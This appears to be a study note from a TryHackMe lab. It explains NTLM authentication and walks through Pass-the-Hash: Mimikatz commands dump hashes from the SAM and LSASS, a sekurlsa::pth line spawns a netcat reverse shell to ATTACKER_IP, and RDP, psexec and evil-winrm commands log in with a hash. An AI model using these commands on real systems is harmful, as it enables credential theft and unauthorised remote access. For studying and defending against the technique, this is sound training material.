## NTLM Authentication
#### How NTLM Authentication works
**NTLM** is a ***challenge-response protocol***.
- Susceptible to `Pass-the-Hash` and `Relay-attacks`.
![[NTLM Authentication.png]]
#### Applicable to Domain Accounts
1. The client sends an ***authentication request to the server*** they want to access.
2. The ***server generates a random number and sends it as a challenge*** to the client.
3. The ***client creates a response using its NTLM password hash and the challenge***, then sends it back.
4. The ***server forwards the challenge and response to the Domain Controller*** (DC).
5. The ***DC uses the challenge to recalculate the response and compares it to the initial response sent by the client*** (uses the ***NTLM hash stored in its database***). If they both match, the client is authenticated.
6. The server forwards the authentication result to the client.

`Note: If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the DC since it has the password stored locally on its SAM.`

--- 
## Pass-the-Hash
#### After gaining **Admin Access** on a host
- Tools like ***Mimikatz can extract credentials.*** Sometimes you get clear-passwords, but often you only get ***NTLM hashes.*** 
- Even without cracking, ***NTLM hashes can be used directly for authentication.***
- This technique is called `Pass-the-Hash` - responding to an NTLM challenge using the hash.
- `Pass-the-Hash` ***works if the Windows Domain is configured to use NTLM Authentication***. 

#### Hashes can be extracted from the ***SAM database*** or ***LSASS memory***.
This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

**Extracting NTLM hashes from local SAM (not Domain Users)**
```mimikatz
privilege::debug 
token::elevate 

lsadump::sam 
	RID : 000001f4 (500) 
	User : Administrator 
		Hash NTLM: 145e02c50333951f71d13c245d352b50
```

**Extracting NTLM hashes from LSASS memory**
```mimikatz
privilege::debug
token::elevate

sekurlsa::msv
	Authentication Id : 0 ; 308124 (00000000:0004b39c) 
	Session : RemoteInteractive from 2 
	User Name : bob.jenkins 
	Domain : ZA 
	Logon Server : THMDC 
	Logon Time : 2022/04/22 09:55:02 
	SID : S-1-5-21-3330634377-1326264276-632209373-4605 
		msv : 
			[00000003] Primary 
			* Username : bob.jenkins 
			* Domain : ZA 
			* NTLM : 6b4a57f67805a663c818106dc0648484
```

#### Perform `Pass-the-Hash` Attack
We can use the extracted hashes to perform a Pass-the-Hash attack by using mimikatz to inject an access token for the victim user on a reverse shell.
```mimikatz
token::revert
sekurlsa::pth /user:<username> /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```
- `token::revert:` used to drop elevated privileges and restore the original user token, because Pass-the-Hash won't work properly with an elevated (e.g. SYSTEM) token.
- This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

#### Start a listener
```bash
nc -nlvp 5555
```
- This shell will show you the original user as the current user, but any command run from here will actually use the credentials we injected as `PtH`.

---
#### Passing the Hash using Linux
If you have access to a linux box, several tools have built-in support to perform Pass-the-Hash using different protocols.

**Connect to `RDP` using `PtH`**
```bash
xfreerdp /v:<victim_ip> /u:<domain\\user> /pth:<ntlm_hash>
```

**Connect via `psexec` using `PtH`
```bash
psexec.py -hashes <NTLM_hash> domain/user@<victim_ip>
```
- `Only the Linux version of psexec support Pass the Hash.`

**Connect to `WinRm` using `PtH`
```bash
evil-winrm -i <victim_ip> -u <username> -H <NTLM_hash>
```
